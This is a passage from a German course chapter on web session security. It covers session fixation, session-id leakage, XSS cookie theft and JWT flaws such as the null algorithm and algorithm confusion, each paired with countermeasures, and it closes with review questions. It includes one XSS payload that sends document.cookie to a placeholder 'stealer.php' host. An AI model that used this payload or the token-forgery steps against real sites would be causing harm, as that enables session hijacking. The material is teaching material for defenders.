+Cookie-basierte Sessionlösung würde diese Überprüfung nicht benötigen,
+dafür allerdings einen kryptographischen Zufallszahlengenerator zur
+Generierung der Session-Id verwenden.</p>
+<p>Negativ für die Sicherheit ist das Fehlen einer server-seitigen
+Session-Komponente. Wie kann eine kompromittierte Session server-seitig
+invalidiert werden? Die naive Lösung, den privaten server-seitigen
+Schlüssel, der zur Erstellung des MACs/der Signatur des Tokens verwendet
+wird, zu tauschen ist nicht praktikabel, da dadurch alle aktiven
+Sessions ungültig werden würden. Wird eine server-seitige Blacklist
+geführt, wird aus dem Token auf einer logischen Ebene eine
+server-seitige Session: der Entwickler hat nun das Rad neu erfunden und
+dabei wahrscheinlich neue Bugs eingebaut.</p>
+<p>Wird eine Kombination von kurzlebigen Access-, und langlebigen
+Refresh-Tokens verwendet, wird dadurch das verwundbare Zeitfenster nur
+reduziert und eine Angreifer muss nur das Refresh- statt dem
+Access-Token entwenden um den selben Effekt zu erreichen. Wird beim
+Neuausstellen des Access-Tokens mittels des Refresh-Tokens das Token
+gegen eine Blacklist verglichen, hat der Entwickler wieder quasi
+server-seitige Sessions neu erfunden.</p>
+<p>Token-basierte Systeme sind gut dafür geeignet, Clients im Auftrag des
+Users Zugriff auf Operationen und Daten zu erlauben. Dies kann z.B. eine
+third-party Webseite oder eine Mobilapplikation sein. Für interaktive
+Webseiten sind sie potentiell suboptimal da sich die Entwickler Gedanken
+um die Revocation ausgestellter Tokens machen müssen. Synergie-Gründe
+(die gleiche API kann von einer Webapplikation als auch von mobilen
+Applikation verwendet werden) können eine Token-basierte Lösung
+interessant machen, in diesem Fall müssen allerdings die Vor- und
+Nachteile der selbst-implementierten Revocation abgewogen werden.</p>
+<h3 id="viewstate">ViewState</h3>
+<p>Das ViewState-pattern speichert den aktuellen Status der View (z.B.
+eingegebene Daten, Verlaufshistorie, aktuell verfügbare Operationen)
+innerhalb des ViewStates, z.B. als hidden Parameter innerhalb jedes
+Formulars. Da der ViewState am Client gespeichert wird, muss der Server
+sich um den Integritäts- und Confidentiality-Schutz kümmern.</p>
+<p>Bei jeder Operation wird der ViewState vom Browser dem Server übergeben.
+Dieser überprüft die Integrität des ViewStates, verifiziert dass der
+ViewState mit der gewünschten Operation kompatibel ist, führt danach die
+Operation aus und aktualisiert den ViewState. Dieser wird dann innerhalb
+der nächsten Formulare wieder als hidden field eingetragen.</p>
+<h2 id="idealer-sessionablauf">Idealer Sessionablauf</h2>
+<p>Der Soll-Session-Lifecycle wäre:</p>
+<ol>
+<li>
+<p>Benutzer führt ein Login durch. Während des erfolgreichem Logins
+   wird eine neue zufällige Session-Id am Server mittels eines
+   kryptographisch-sicheren Zufallsgenerator generiert, und dem Client
+   auf sicherem Weg mitgeteilt.</p>
+</li>
+<li>
+<p>Der eingeloggte Benutzer führt nun mehrere Operationen aus. Der
+   Browser des Benutzers inkludiert das Session-Cookie bei jedem
+   Zugriff.</p>
+</li>
+<li>
+<p>Vor dem Zugriff auf sensible Operationen oder Daten wird überprüft,
+   ob die Session-Id noch aktiv ist. Der logische Benutzer wird der
+   Session zugeordnet und die Applikation führt Überprüfung der
+   Benutzeridentität und -berechtigung durch.</p>
+</li>
+<li>
+<p>Während des Logouts wird sowohl server-seitig als auch client-seitig
+   das Session-Cookie gelöscht und damit die Session auf beiden Seiten
+   invalidiert.</p>
+</li>
+</ol>
+<h2 id="potentielle-probleme-beim-session-management">Potentielle Probleme beim Session-Management</h2>
+<p>Während der ideale Sessionverlauf relativ einfach aussieht, können dabei
+mehrere sicherheitsrelevante Probleme auftreten:</p>
+<h3 id="session-id-wird-verloren">Session-Id wird verloren</h3>
+<p>Die Session-ID dient als Erkennungsmerkmal eines Benutzers. Wenn ein
+Angreifer die Session-Id erlangt, kann er die Identität des Benutzers am
+Server übernehmen.</p>
+<p>Am einfachsten gelingt dies, wenn der Server nicht HTTPS verwendet. In
+diesem Fall benötigt der Angreifer nur Zugriff auf die Transportdaten
+(z.B. mittels Sniffing im gleichen WLAN ohne Client-Separation). Der
+Angreifer kann nun seine Session-Id mit der des Opfers ersetzen und
+übernimmt auf diese Weise dessen Identität.</p>
+<p>Aus diesem Grund sollten Webseiten nur mehr mittels HTTPS angeboten
+werden und auch automatisch HTTP Aufrufe auf HTTPS umleiten. Da zumeist
+Webseiten sowohl über HTTP und HTTPS angeboten werden, kann es zu
+Problemen kommen: z.B. könnte ein unbedarfter Benutzer eine HTTP Adresse
+in einem Browser eingeben. In diesem Fall übermittelt der Browser
+automatisch bei diesem ungesicherten Request das Session-Cookie. Während
+er danach automatisch vom Server auf HTTPS umgeleitet wird, ist dies
+bereits zu spät da bei dem ersten ungesicherten Request schon das Cookie
+disclosed wurde.</p>
+<p>Eine Lösung für dieses Problem bietet das secure-Flag das bei einem
+Cookie gesetzt werden kann. Dieses Flag unterrichtet den Webbrowser,
+dass das Cookie nur mittels HTTPS übertragen werden darf. Im Fall einer
+HTTP Operation wird die Operation durch den Browser ohne Cookie
+durchgeführt. Die Verbindungssicherheit kann ebenso durch die Verwendung
+des HSTS-Headers bzw. durch Einsatz bestimmter CSP-Direktiven
+sichergestellt werden.</p>
+<h3 id="mixed-content-firesheep">Mixed-Content / FireSheep</h3>
+<p>Die Verwendung von sowohl HTTP als auch HTTPS innerhalb einer Seite ist
+ebenso problematisch. Dieses Pattern war um das Jahr 2010/11 stark
+verbreitet, u.a. von Seiten wie Facebook, Twitter und Flickr. In diesem
+Fall war nur die Login und Logout Operation mittels HTTPS geschützt,
+weitere Inhalte wurde mittels HTTP übertragen. Die Begründung war, dass
+sensible Daten (Benutzername und Passwort) verschlüsselt werden und
+keine sensiblen Daten in den übertragenen Seiten enthalten sind[2].
+Hauptgrund dafür war gering verfügbare Rechenkapazität und die relativ
+"teure" Verschlüsselung (also schlussendlich Kosten).</p>
+<p>Dies ist natürlich problematisch, da ein Angreifer mit Zugriff auf die
+Netzwerkdaten die Session-Id extrahieren und dadurch die serverseitige
+Identität übernehmen kann. Dies wurde eindrucksvoll mittels FireSheep
+gezeigt: diese Firefox-Erweiterung zeigte in einer SideBar alle
+erkannten Sessions an, der Anwender konnte durch Click auf die Sidebar
+die jeweilige Session im Browser aktivieren. Aufgrund der Publicity
+dieses Tools fingen Seiten schnell an, HTTPS durchgängig zu
+implementieren. Eine weitere Firefox Erweiterung die in Reaktion darauf
+erschien war HTTP Everywhere (erzwingt den Einsatz von HTTPS wenn eine
+Seite sowohl über HTTP und HTTPS verfügbar ist).</p>
+<h3 id="session-id-in-get-parameter">Session-Id in GET-Parameter</h3>
+<p>Sensible Daten sollten niemals als Teil der URL bzw. über HTTP GET
+Parameter übertragen werden. Dies gilt auch für die Session-Id.</p>
+<p>Welche Probleme können bei der Verwendung als GET Parameter auftreten?</p>
+<ul>
+<li>
+<p>Die Session-Id ist Teil der URL und wird mit hoher
+  Wahrscheinlichkeit in Web-Proxies und Web-Server Logdateien
+  gespeichert.</p>
+</li>
+<li>
+<p>Die URL inklusive der GET Parameter sind Teil der Browser Historie.
+  Durch Fehler in Browsern können Fremdseiten teilweise auf die
+  Browserhistorie zugreifen.</p>
+</li>
+<li>
+<p>GET Parameter werden teilweise von Site Analysis Tools verwendet.
+  Dies würde implizieren, dass z.B. bei Verwendung von Google
+  Analytics alle Session-IDs an Alphabet weitergeleitet werden.</p>
+</li>
+<li>
+<p>Wird ein Cookie als Teil der URL verwendet, wird dieser Session-Wert
+  im Normalfall über den Referer-Header übertragen. Auf diese Weise
+  würde jede besuchte externe Webseite diesen Session-Wert.</p>
+</li>
+</ul>
+<p>Anstatt des GET-Parameters sollte die Cookie-basierte HTTP Session
+verwendet werden. Falls dies nicht möglich ist, sollte ein HTTP POST
+statt GET verwendet werden. Während dies die Gefährdung durch einen
+bösartigen Angreifer nicht minimiert, verringert es das Fehlerrisiko.</p>
+<h3 id="session-id-ist-vorher-bestimmbar">Session-Id ist vorher bestimmbar</h3>
+<p>Eine Session-Id muss eine zufällig generierte Zahl sein, dies impliziert
+die Verwendung eines kryptographischen Zufallszahlengenerators.
+Beispiele für schlecht gewählte Session-Ids wären:</p>
+<ul>
+<li>
+<p>Aufsteigende Zahlen</p>
+</li>
+<li>
+<p>Verwenden eines Hashs über erratbare Eingangswerte:
+  <em>hash(Systemzeit)</em>, <em>hash(username)</em>, <em>hash(username:password)</em>.</p>
+</li>
+<li>
+<p>Verwenden eines MACs über konstante Daten: <em>mac(username)</em>,
+  <em>mac(username:password)</em></p>
+</li>
+<li>
+<p>mac(systemzeit) — mittels NTP Angriffe kann versucht werden, die
+  Zeit des Servers in die Vergangenheit zu bewegen.</p>
+</li>
+<li>
+<p>Verwendung eines nicht-kryptographisch sicheren
+  Zufallszahlengenerator (z.B. <em>java.util.Random</em> statt
+  <em>java.security.SecureRandom</em> in Java).</p>
+</li>
+</ul>
+<p>Während eines Pen-Tests würde die Zufälligkeit der Session-Id getestet
+werden. Dies geschieht indem man sich mehrere Tausend Male einloggt und
+mittels statistischer Methoden die Zufälligkeit und Entropie der
+Session-Id analysiert.</p>
+<h3 id="session-fixation">Session Fixation</h3>
+<p>Ein weiteres Problem besteht, wenn der Angreifer eine Session-Id dem
+Clientbrowser vorschreiben kann bzw. eine konstante Session-Id bekannt
+ist.</p>
+<p>Letzteres passiert, wenn die Webapplikation beim ersten Zugriff eines
+Browsers eine Session-Id vergibt und diese während des Logins nicht neu
+setzt. Im einfachsten Fall würde ein Angreifer kurz Zugriff auf den
+Browser des Opfers erhalten (z.B. durch einen nicht gesperrten PC
+innerhalb eines Büros), die Zielwebseite besuchen und den Wert des
+Session Cookies aufzeichnen. Wenn sich nun (Stunden später) das Opfer
+einloggt, kennt der Angreifer bereits den Wert des Session-Cookies und
+kann auf diese Weise die Session übernehmen.</p>
+<p>Alternativ: unter der Annahme, dass die Webseite zusätzlich eine
+Operation besitzt bei der das Session-Cookie mittels HTTP GET Parameter
+übergeben wird. In dem Fall kann der Angreifer einen Social Engineering
+Angriff durchführen. Er verschickt Emails mit Links auf die betreffende
+Operation mit zufällig generierten Session-Ids. Wenn ein Opfer nun auf
+diese Operation zugreift, erkennt der Webserver, dass das Opfer nicht
+eingeloggt ist und leitet das Opfer zum Login-Dialog. Das Opfer logt
+sich ein, der Webserver übernimmt die Session-Id. Der Angreifer muss nur
+periodisch testen, ob mit einer der versendeten Session-Ids ein Login
+möglich ist.</p>
+<h3 id="session-extraktion-mittels-xss-lucke">Session-Extraktion mittels XSS-Lücke</h3>
+<p>Mittels Javascript kann auf Session-Cookies zugegriffen werden. Falls
+die Webseite eine (der häufigen) XSS-Lücken[3]) besitzt kann ein
+Angreifer nun Javascript-Code auf der Webseite platzieren, warten bis
+ein anderer Benutzer darauf zugreift und mittels des Javascript-Codes
+die Session-Id auf einen externen Server übermitteln. Dieser
+Angriffsvektor macht vor allem Spaß, wenn eine Nachrichtenfunktion
+innerhalb einer Applikation verwundbar ist, da man dadurch einzelne
+Benutzer direkt anvisieren kann.</p>
+<p>Beispiel für ein einfaches Javascript-Fragment welches ein Redirect auf
+einen externen Server (xyz.com) durchführt und als GET-Parameter die
+aktuellen Cookies übergibt:</p>
+<div class="highlight"><pre><span></span><code>    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://xyz.com/stealer.php?cookie=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Folgende Gegenmaßnahmen sollten implementiert werden:</p>
+<ul>
+<li>
+<p>keine XSS-Lücke in der Webseite implementieren…</p>
+</li>
+<li>
+<p>durch Verwendung des httpOnly-Cookie Flags kann dem Webbrowser
+  mitgeteilt werden, dass der Zugriff mittels Javascript auf das
+  Session Cookie nicht erlaubt ist.</p>
+</li>
+<li>
+<p>CSP bietet Möglichkeiten XSS-Angriffe einzuschränken.</p>
+</li>
+</ul>
+<h2 id="json-web-tokens">JSON Web Tokens</h2>
+<p>JSON Web Tokens (JWT) sind standardisierte (RFC 7519) Tokens die als
+HTTP Parameter, HTTP Session Cookies oder mittels eines HTTP Headers
+übertragen werden können. Ein JSON Web-Token besteht aus drei Bereichen:</p>
+<ul>
+<li>
+<p>Header: dieser Bereich speichert vor allem den verwendeten
+  Algorithmus zur Erstellung des Integrity Checks.</p>
+</li>
+<li>
+<p>Content: JSON-Dokument welches die eigentliche Payload des Tokens
+  ist. Es gib hier mehre vordefinierte optionale Werte: <em>iss</em>
+  beschreibt den Issuer/Aussteller des Tokens, <em>sub</em> beschreibt das
+  Subjekt des tokens, <em>aud</em> die geplante Audience (welche Server
+  sollen das Token erhalten), <em>exp</em> und <em>nbf</em> den Gültigkeitszeitraum
+  des tokens, <em>iat</em> den Ausstellungszeitpunkt.</p>
+</li>
+<li>
+<p>Integrity Check: der integrity check verwendet den, im <em>alg</em>-Header
+  definierten Algorithmus über <em>header</em> und <em>content</em> um eine
+  Checksumme zu bilden.</p>
+</li>
+</ul>
+<p>Die Gesamtstruktur des Tokens ist:</p>
+<div class="highlight"><pre><span></span><code>    verification = algorithm(base64(header) + &quot;.&quot; + base64(content))
+    token = base64(header) + &quot;.&quot; + base64(content) + &quot;.&quot; + base64(hash)
+</code></pre></div>
+<p>Ein Beispiel für einen Token (man kann dabei die drei durch einen .
+getrennten Base64-Bereiche erkennen. Da es sich um encoded JSON handelt,
+beginnen die beiden ersten Base64-Blöcke immer mit <em>eyJ</em>):</p>
+<div class="highlight"><pre><span></span><code>    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+</code></pre></div>
+<h3 id="problem-null-algorithmus">Problem: Null-Algorithmus</h3>
+<p>Ein grundlegendes Problem bei JWT ist, dass die Checksumme nur über den
+<em>content</em> Bereich berechnet wird. Der gesamte <em>header</em> Bereich wird
+nicht integritätsgeschützt. Dies erlaubt es einem Angreifer, die in dem
+Header vorhandenen Metadaten beliebig zu verändern.</p>
+<p>Ein einfacher Angriff gegenüber JWT das Setzen des <em>alg</em> Parameters
+innerhalb des Headers auf den <em>NULL</em>-Algorithmus. Dies bedeutet, dass
+keine Checksumme berechnet, und der dritte Part des JWTs einfach leer
+bleibt. Dadurch kann der Angreifer den content nun beliebig wählen und
+verletzt dabei trotzdem keine Integritätsregeln.</p>
+<h3 id="probleme-bei-mac-basierter-verifizierung">Probleme bei MAC-basierter Verifizierung</h3>
+<p>Wenn ein Angreifer einen ausgestellten JWT empfängt (weil er z.B. ein
+Benutzer einer Webapplikation ist) besitzt er die Möglichkeit, einen
+Offline-Brute Force Angriff gegen den Token durchzuführen. Der Angreifer
+besitzt die Eingangsdaten für den MAC (die Base64-codierten <em>header</em> und
+<em>content</em> Bereiche des Tokens) und kann nun mittels eines Brute-Force
+Angriffs versuchen, den Schlüssel des MACs zu erraten.</p>
+<p>Aus diesem Grund muss bei Einsatz eines MACs immer ein sehr sicherer
+Schlüssel gewählt werden.</p>
+<h3 id="problem-mac-vs-signature">Problem: MAC vs. Signature</h3>
+<p>Ein weiteres Problem tritt bei einer Confusion betreffend dem
+verwendeten Verfahren zur Berechnung der Prüfsumme (dritter Bereich des
+Tokens) auf. Hier gibt es die Möglichkeit, dass ein Public-Key basiertes
+Verfahren zur Erstellung einer Signatur oder ein shared-key basiertes
+Verfahren zur Erstellung eines MACs verwendet wird.</p>
+<p>Die Methode zur Verifikation eines Tokens wird folgend aufgerufen:</p>
+<pre><code>    validate(token, key)
+</code></pre>
+<p>Als erster Parameter wird das zu verifizierende Token übergeben, als
+zweiter Parameter wird der zu verwendende Key übergeben. Bei einem
+Signature-basierten Verfahren würde hier der public-key übergeben (da
+die Signatur ja mittels des public-Keys verifiziert wird), bei einem
+MAC-basierten Verfahren wird hier der shared private key übergeben (der
+für die Berechnung des MACs benötigt wird). Die Selektion des Verfahrens
+geschieht über den <em>alg</em> Parameter im Header des Tokens. Wird ein
+Signatur-basiertes Verfahren gewählt, ist der Public-Key fast immer
+öffentlich verfügbar.</p>
+<p>Ein Problem tritt nun auf, wenn der Entwickler eines Services davon
+ausgeht, dass der Client immer ein Signatur-basiertes Verfahren
+verwenden wird. In dem Fall würde eine naive Implementierung folgenden
+Code wählen:</p>
+<pre><code>    # assume that token is an signature-based token
+    validate(token, public-key)
+</code></pre>
+<p>Es wird also der public key verwendet um die Signatur zu überprüfen.</p>
+<p>Ein Angreifer kann nun den public key herunterladen und selbst ein neues
+Token erstellen. Bei diesem setzt er den <em>alg</em> Wert auf <em>MAC</em>, generiert
+also ein MAC-basiertes Token. Als geheimen Schlüssel für dieses Token
+verwendet er den public key der für die Überprüfung der Signatur
+verwendet wird. Wenn er nun dieses Token an den Service übergibt wird
+folgendes Code-Fragment aufgerufen:</p>
+<pre><code>    # token ist ein MAC-basiertes token
+    # die validate Funktion wird deswegen versuchen
+    # einen MAC zu berechnen und verwendet dafür
+    # den zweiten Parameter (public-key)
+    validate(token, public-key)
+</code></pre>
+<p>Da der Server (hardcoded) annimmt, dass eine Signatur überprüft wird,
+wird der public key (den der Angreifer zum Erstellen des MACs verwendet
+hat) als Schlüssel übergeben. Die validate Funktion liest nun das Token,
+erkennt, dass dieses MAC-basiert ist und verwendet nun den übergebenen
+Schlüssel um einen MAC zu berechnen. Dieser ist nun ident zu dem MAC den
+der Angreifer gespeichert hat und die Operation wird aufgerufen, obwohl
+der Angreifer darauf keinen Zugriff erhalten sollte.</p>
+<p>Dieses Problem zeigt, dass der Entwickler des Webservices immer
+sicherstellen muss, dass das Token den erwarteten Algorithmus (in diesem
+Fall einen Signatur-basierten Algorithmus) verwendet. Falls das Token
+hier einen anderen Algorithmus verwendet hat, muss das Token verworfen
+werden.</p>
+<h2 id="reflektionsfragen">Reflektionsfragen</h2>
+<ol>
+<li>
+<p>Was versteht man unter einem Session-Fixation Angriff?</p>
+</li>
+<li>
+<p>Erkläre client- und server-seitige Session-Konzepte. Welche Variante
+   sollte man aus Sicherheitsgründen wählen und erläutere dies.</p>
+</li>
+<li>
+<p>Wie sieht ein guter Umgang mit einer Session aus? Wann wird diese
+   angelegt, wann gelöscht. Wie sollte sie implementiert werden?</p>
+</li>
+<li>
+<p>Welche sicherheits-relevenaten Probleme gibt es im Zusammenhang von
+   Mixed-Content und Session-IDs?</p>
+</li>
+<li>
+<p>Warum sollten Session-ID nie innerhalb der URL (bzw. als HTTP
+   GET-Parameter) verwendet werden?</p>
+</li>
+</ol>
+<p>[1] <em>Message Authentication Code</em></p>
+<p>[2] Ja, es war eine einfachere Zeit. Mittlerweile würde der Inhalt eines
+Facebook-Kontos auch als kritisch eingeschätzt werden.</p>
+<p>[3] Siehe auch das XSS-Kapitel</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Zurück zum Seitenanfang
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.sections", "navigation.tracking", "navigation.path", "navigation.top", "search.suggest", "search.highlight", "content.tabs.link", "content.code.annotation", "content.code.copy"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "In Zwischenablage kopiert", "clipboard.copy": "In Zwischenablage kopieren", "search.result.more.one": "1 weiteres Suchergebnis auf dieser Seite", "search.result.more.other": "# weitere Suchergebnisse auf dieser Seite", "search.result.none": "Keine Suchergebnisse", "search.result.one": "1 Suchergebnis", "search.result.other": "# Suchergebnisse", "search.result.placeholder": "Suchbegriff eingeben", "search.result.term.missing": "Es fehlt", "select.version": "Version ausw\u00e4hlen"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
